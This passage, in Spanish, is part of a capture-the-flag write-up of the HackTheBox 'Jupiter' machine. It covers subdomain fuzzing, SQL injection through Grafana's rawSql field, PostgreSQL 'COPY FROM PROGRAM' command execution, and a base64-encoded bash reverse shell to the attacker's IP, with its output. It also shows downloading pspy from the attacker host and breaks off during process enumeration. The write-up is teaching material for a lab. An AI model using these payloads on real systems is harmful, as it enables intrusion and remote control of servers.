</span></span></code></pre></div><p>Con esto estamos diciendo que el dominio jupiter.htb hace referencia a la ip 10.10.11.216. Ahora ya podemos acceder a la web desde el navegador. La web no tiene nada interesante, asi que vamos a buscar subdominios, para ello podemos usar muchas herramientas, pero voy a usar wfuzz</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wfuzz -c -t <span class=m>20</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class=s2>&#34;Host: FUZZ.jupiter.htb&#34;</span> http://jupiter.htb/
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li>-c: Mostrar el resultado con colores</li><li>-t: Definir el tiempo del escaneo</li><li>-w: Diccionario</li><li>-H: Especificar un header</li><li>FUZZ: Es donde va a ir probando el contenido del diccionario</li></ul></details><br><p>Este comando nos muestra muchos subdominios, pero todos tienen código 301, 178 caracteres, 12 palabras y 7 líneas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       <span class=nv>Payload</span>                                       
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>000000001:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;www&#34;</span>                                         
</span></span><span class=line><span class=cl>000000045:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;www1&#34;</span>                                        
</span></span><span class=line><span class=cl>000000042:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;static&#34;</span>                                      
</span></span><span class=line><span class=cl>000000015:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;ns&#34;</span>                                          
</span></span><span class=line><span class=cl>000000003:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;ftp&#34;</span>                                         
</span></span><span class=line><span class=cl>000000031:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;mobile&#34;</span>                                      
</span></span><span class=line><span class=cl>000000044:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;web&#34;</span>                                         
</span></span><span class=line><span class=cl>000000046:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;img&#34;</span>                                         
</span></span><span class=line><span class=cl>000000041:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;dns1&#34;</span>                                        
</span></span><span class=line><span class=cl>000000043:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;lists&#34;</span>                                       
</span></span><span class=line><span class=cl>000000040:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;ns4&#34;</span>                                         
</span></span><span class=line><span class=cl>000000007:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;webdisk&#34;</span>                                     
</span></span><span class=line><span class=cl>000000039:   <span class=m>301</span>        <span class=m>7</span> L      <span class=m>12</span> W       <span class=m>178</span> Ch      <span class=s2>&#34;dns2&#34;</span>
</span></span><span class=line><span class=cl>...   
</span></span></code></pre></div><p>Lo que podemos hacer es añadir el parámetro <code>-hh=178</code> para ocultar las respuestas con 178 caracteres.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wfuzz -c -t <span class=m>20</span> --hh<span class=o>=</span><span class=m>178</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class=s2>&#34;Host: FUZZ.jupiter.htb&#34;</span> http://jupiter.htb/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       <span class=nv>Payload</span>                                       
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>000001955:   <span class=m>200</span>        <span class=m>211</span> L    <span class=m>798</span> W      <span class=m>34390</span> Ch    <span class=s2>&#34;kiosk&#34;</span> 
</span></span></code></pre></div><p>Ahora ya nos reporta un subdominio, <code>kiosk</code>, para poder verlo tenemos que añadirlo en el /etc/hosts de la siguiente forma</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.11.216 jupiter.htb kiosk.jupiter.htb
</span></span></code></pre></div><p>Al entrar a <code>kiosk.jupiter.htb</code>, vemos una web hecha con <strong>Grafana</strong>, concretamente si nos vamos al <a href=http://kiosk.jupiter.htb/login>login</a> vemos que es un grafana <strong>v9.5.2</strong>.</p><p>En la página principal, si nos vamos a cualquier apartado y le damos a los 3 puntos > inspeccionar > Panel JSON, vemos lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;datasource&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;postgres&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;uid&#34;</span><span class=p>:</span> <span class=s2>&#34;YItSLg-Vz&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;fieldConfig&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;defaults&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;mappings&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;thresholds&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;percentage&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;steps&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;color&#34;</span><span class=p>:</span> <span class=s2>&#34;green&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;color&#34;</span><span class=p>:</span> <span class=s2>&#34;orange&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=mi>70</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;color&#34;</span><span class=p>:</span> <span class=s2>&#34;red&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=mi>85</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;color&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;thresholds&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;overrides&#34;</span><span class=p>:</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;gridPos&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;h&#34;</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;w&#34;</span><span class=p>:</span> <span class=mi>12</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;x&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;y&#34;</span><span class=p>:</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;options&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;reduceOptions&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;values&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;calcs&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;lastNotNull&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>],</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;fields&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;orientation&#34;</span><span class=p>:</span> <span class=s2>&#34;auto&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;textMode&#34;</span><span class=p>:</span> <span class=s2>&#34;auto&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;colorMode&#34;</span><span class=p>:</span> <span class=s2>&#34;value&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;graphMode&#34;</span><span class=p>:</span> <span class=s2>&#34;area&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;justifyMode&#34;</span><span class=p>:</span> <span class=s2>&#34;auto&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;pluginVersion&#34;</span><span class=p>:</span> <span class=s2>&#34;9.5.2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;targets&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;datasource&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;postgres&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;uid&#34;</span><span class=p>:</span> <span class=s2>&#34;YItSLg-Vz&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;editorMode&#34;</span><span class=p>:</span> <span class=s2>&#34;code&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;format&#34;</span><span class=p>:</span> <span class=s2>&#34;table&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;hide&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;rawQuery&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;rawSql&#34;</span><span class=p>:</span> <span class=s2>&#34;select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = &#39;Jupiter&#39;;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;refId&#34;</span><span class=p>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;sql&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;columns&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;parameters&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;groupBy&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;property&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;groupBy&#34;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;limit&#34;</span><span class=p>:</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Number of Moons&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;stat&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Teniendo esto, nos podemos fijar en que la base de datos es postgres y que se está haciendo una petición a la base de datos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>select</span> <span class=se>\n</span>  count<span class=o>(</span>parent<span class=o>)</span> <span class=se>\n</span>from <span class=se>\n</span>  moons <span class=se>\n</span>where <span class=se>\n</span>  <span class=nv>parent</span> <span class=o>=</span> <span class=s1>&#39;Jupiter&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p>Si volvemos a la página principal y hacemos <code>ctrl + shift + c</code> y vamos al apartado <strong>Red</strong> podemos ver que a medida que vamos scroleando se van haciendo peticiones. Vamos a interceptarlas con burpsuite.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST /api/ds/query HTTP/1.1
</span></span><span class=line><span class=cl>Host: kiosk.jupiter.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> Linux x86_64<span class=p>;</span> rv:109.0<span class=o>)</span> Gecko/20100101 Firefox/119.0
</span></span><span class=line><span class=cl>Accept: application/json, text/plain, */*
</span></span><span class=line><span class=cl>Accept-Language: es-ES,es<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8,en-US<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.5,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.3
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br
</span></span><span class=line><span class=cl>Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId<span class=o>=</span>1<span class=p>&amp;</span><span class=nv>refresh</span><span class=o>=</span>1d
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;queries&#34;</span>:<span class=o>[{</span><span class=s2>&#34;refId&#34;</span>:<span class=s2>&#34;A&#34;</span>,<span class=s2>&#34;datasource&#34;</span>:<span class=o>{</span><span class=s2>&#34;type&#34;</span>:<span class=s2>&#34;postgres&#34;</span>,<span class=s2>&#34;uid&#34;</span>:<span class=s2>&#34;YItSLg-Vz&#34;</span><span class=o>}</span>,<span class=s2>&#34;rawSql&#34;</span>:<span class=s2>&#34;select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = &#39;Jupiter&#39;;&#34;</span>,<span class=s2>&#34;format&#34;</span>:<span class=s2>&#34;table&#34;</span>,<span class=s2>&#34;datasourceId&#34;</span>:1,<span class=s2>&#34;intervalMs&#34;</span>:60000,<span class=s2>&#34;maxDataPoints&#34;</span>:928<span class=o>}]</span>,<span class=s2>&#34;range&#34;</span>:<span class=o>{</span><span class=s2>&#34;from&#34;</span>:<span class=s2>&#34;2023-11-01T11:31:09.304Z&#34;</span>,<span class=s2>&#34;to&#34;</span>:<span class=s2>&#34;2023-11-01T17:31:09.304Z&#34;</span>,<span class=s2>&#34;raw&#34;</span>:<span class=o>{</span><span class=s2>&#34;from&#34;</span>:<span class=s2>&#34;now-6h&#34;</span>,<span class=s2>&#34;to&#34;</span>:<span class=s2>&#34;now&#34;</span><span class=o>}}</span>,<span class=s2>&#34;from&#34;</span>:<span class=s2>&#34;1698838269304&#34;</span>,<span class=s2>&#34;to&#34;</span>:<span class=s2>&#34;1698859869304&#34;</span><span class=o>}</span>
</span></span></code></pre></div><p>En la petición interceptada podemos ver la petición que se está haciendo a la base de datos Postgres</p><h2 id=intrusión>Intrusión<a href=#intrusión class=anchor aria-hidden=true>#</a></h2><p>Para saber como hacer una inyección a un <strong>PostgreSQL</strong> existe un recurso muy interesante de la repo de <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution><strong>Payloads All The Things</strong></a>, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)</p><p>Básicamente, consiste en crear una tabla en la base de datos en uso por la web</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>(</span><span class=n>cmd_output</span><span class=w> </span><span class=nb>text</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>Mediante COPY se pondrá en la tabla el resultado del comando <code>id</code>, lo que provocará que se ejecute el comando <code>ìd</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>COPY</span><span class=w> </span><span class=n>cmd_exec</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>PROGRAM</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Sabiendo esto vamos con la explotación:</p><p>Creamos la tabla <code>cmd_exec</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;rawSql&#34;</span>:<span class=s2>&#34;CREATE TABLE cmd_exec(cmd_output text);&#34;</span>
</span></span></code></pre></div><p>Ahora nos ponemos en escucha por la interfaz tun0 a la espera de paquetes icmp que son los que usa ping.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo tcpdump -i tun0 icmp
</span></span></code></pre></div><p>Por último mandamos la inyección para ejecutar un ping a nuestra máquina</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;rawSql&#34;</span>:<span class=s2>&#34;COPY cmd_exec FROM PROGRAM &#39;ping -c 1 10.10.14.28&#39;;&#34;</span>
</span></span></code></pre></div><p>El servidor nos responde con un status 200</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;results&#34;</span><span class=p>:{</span><span class=nt>&#34;A&#34;</span><span class=p>:{</span><span class=nt>&#34;status&#34;</span><span class=p>:</span><span class=mi>200</span><span class=p>,</span><span class=nt>&#34;frames&#34;</span><span class=p>:[]}}}</span>
</span></span></code></pre></div><p>Y vemos que se ha hecho el ping correctamente, lo que significa que tenemos capacidad de ejecutar comandos en la máquina víctima</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>18:47:24.492218 IP jupiter.htb &gt; 10.10.14.28: ICMP <span class=nb>echo</span> request, id 2, seq 1, length <span class=m>64</span>
</span></span><span class=line><span class=cl>18:47:24.492238 IP 10.10.14.28 &gt; jupiter.htb: ICMP <span class=nb>echo</span> reply, id 2, seq 1, length <span class=m>64</span>
</span></span></code></pre></div><h3 id=reverse-shell>Reverse shell<a href=#reverse-shell class=anchor aria-hidden=true>#</a></h3><p>Vamos a ponernos en escucha con netcat por el puerto 443</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>La revershell la vamos a mandar con bash: <code>bash -i >& /dev/tcp/10.10.14.28/443 0>&amp;1</code>, pero lo pondremos dentro de <code>bash -c "bash- i..."</code> porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.28/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.28/443 0&gt;&amp;1&#34;&#39;</span> <span class=p>|</span> base64
</span></span></code></pre></div><p>El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un <code>base64 -d</code> para decodear el base64 y por último <code>bash</code> para que el resultado del base64 lo ejecute con bash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK <span class=p>|</span> base64 -d <span class=p>|</span> bash
</span></span></code></pre></div><p>Esto aplicado a la inyección quedaría de la siguiente forma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;rawSql&#34;</span>:<span class=s2>&#34;COPY cmd_exec FROM PROGRAM &#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash&#39;;&#34;</span>
</span></span></code></pre></div><p>¡Recibimos la conexión!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -nlvp <span class=m>443</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.28<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.216<span class=o>]</span> <span class=m>46594</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>18744<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>postgres@jupiter:/var/lib/postgresql/14/main$ 
</span></span></code></pre></div><p>Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Con un ifconfig podemos comprobar que estamos en la máquina víctima y no en ningún contenedor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@jupiter:/var/lib/postgresql/14/main$ ifconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
</span></span><span class=line><span class=cl>        inet 10.10.11.216  netmask 255.255.254.0  broadcast 10.10.11.255
</span></span><span class=line><span class=cl>        ...
</span></span></code></pre></div><p>Sabiendo que la web era un grafana, existe un archivo interesante, el cual puede contener credenciales e información de valor que está en <code>/etc/grafana/grafana.ini</code>, pero no tenemos permisos para verlo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@jupiter:/etc/grafana$ cat grafana.ini
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat: grafana.ini: Permission denied
</span></span></code></pre></div><h3 id=juno>juno<a href=#juno class=anchor aria-hidden=true>#</a></h3><p>Vamos a investigar si hay alguna tarea cron ejecutándose cada &lsquo;x&rsquo; tiempo, para ello vamos a usar <a href=https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64>pspy</a>. Para usarlo simple nos lo descargamos en nuestra máquina, nos montamos un servidor con python en el directorio en el que esté guardado</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server
</span></span></code></pre></div><p>Y nos lo descargamos en la máquina víctima en el directorio /tmp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget 10.10.14.28/pspy64
</span></span></code></pre></div><p>Por último le damos permisos de ejecución y lo ejecutamos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod +x pspy64
</span></span><span class=line><span class=cl>./pspy64
</span></span></code></pre></div><p>Después de un rato capturando procesos vemos un script ubicado en <code>/home/juno/shadow-simulation.sh</code> el cual se esta ejecutando con bash. También se está ejecutando /home/juno/.local/bin/shadow pasandole el archivo /dev/shm/network-simulation.yml</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21187</span>  <span class=p>|</span> /bin/bash /home/juno/shadow-simulation.sh 
</span></span><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21186</span>  <span class=p>|</span> /bin/sh -c /home/juno/shadow-simulation.sh 
</span></span><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21189</span>  <span class=p>|</span> /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
</span></span><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21198</span>  <span class=p>|</span> /usr/bin/python3 -m http.server <span class=m>80</span> 
